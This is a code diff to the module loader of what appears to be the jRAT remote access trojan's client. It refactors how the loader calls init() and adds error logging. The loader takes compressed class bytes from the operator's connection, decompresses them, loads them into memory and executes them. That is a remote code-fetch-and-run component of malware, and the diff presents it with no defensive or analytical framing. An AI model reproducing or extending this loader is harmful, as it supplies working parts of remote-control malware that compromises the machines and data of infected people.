@@ -2,11 +2,10 @@ package jrat.client.modules;
 
 import jrat.api.Module;
 import jrat.client.Connection;
-import jrat.client.MemoryClassLoader;
 import jrat.client.Main;
+import jrat.client.MemoryClassLoader;
+import jrat.common.Logger;
 import jrat.common.compress.QuickLZ;
-
-import java.lang.reflect.Method;
 
 public class ModuleLoader {
 
@@ -34,7 +33,7 @@ public class ModuleLoader {
                 byte[] buffer = new byte[classLen];
                 c.getDataInputStream().readFully(buffer);
 
-                buffer =  QuickLZ.decompress(buffer);
+                buffer = QuickLZ.decompress(buffer);
 
                 if (clazz) {
                     l.addClass(name, buffer);
@@ -46,11 +45,16 @@ public class ModuleLoader {
             }
 
             // load the main class
-            Class<Module> module = (Class<Module>) l.loadClass(mainClass);
-            Method method = module.getMethod("init");
+            Class<Module> clazz = (Class<Module>) l.loadClass(mainClass);
 
-            // invoke init()
-            method.invoke(module.newInstance());
+            Module module = clazz.newInstance();
+
+            try {
+                module.init();
+            } catch (Exception ex) {
+                Logger.warn("module " + mainClass + " failed to load");
+                ex.printStackTrace();
+            }
         }
     }
 }
